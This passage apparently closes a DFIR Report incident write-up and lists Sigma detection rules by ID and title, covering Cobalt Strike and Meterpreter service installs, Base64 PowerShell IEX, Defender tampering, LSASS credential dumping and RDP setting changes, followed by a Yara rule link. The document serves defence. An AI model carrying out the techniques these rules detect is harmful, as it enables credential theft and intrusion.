d7a95147-145f-4678-b85d-d1ff4a3bb3f6 : CobaltStrike Service Installations - Security 3ef5605c-9eb9-47b0-9a71-b727e6aa5c3b : Use NTFS Short Name in Image 88f680b8-070e-402c-ae11-d2914f2257f1 : PowerShell Base64 Encoded IEX Cmdlet 1ec65a5f-9473-4f12-97da-622044d6df21 : Powershell Defender Disable Scan Feature ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34 : Meterpreter or Cobalt Strike Getsystem Service Installation - Security 5ef9853e-4d0e-4a70-846f-a9ca37d876da : Potential Credential Dumping Activity Via LSASS 962fe167-e48d-4fd6-9974-11e5b9a5d6d1 : LSASS Access From Non System Account a2863fbc-d5cb-48d5-83fb-d976d4b1743b : RDP Sensitive Settings Changed to Zero d6ce7ebd-260b-4323-9768-a9631c8d4db2 : RestrictedAdminMode Registry Value Tampering ed74fe75-7594-4b4b-ae38-e38e3fd2eb23 : Outbound RDP Connections Over Non-Standard Tools 01aeb693-138d-49d2-9403-c4f52d7d3d62 : RDP Connection Allowed Via Netsh.EXE

### Yara

https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19530/19530.yar

## MITRE ATT&CK

Internal case #19530

##### Share this entry

- Share on Facebook

- Share on X

- Share on WhatsApp

- Share on Linkedin

- Share on Reddit

- Share by Mail
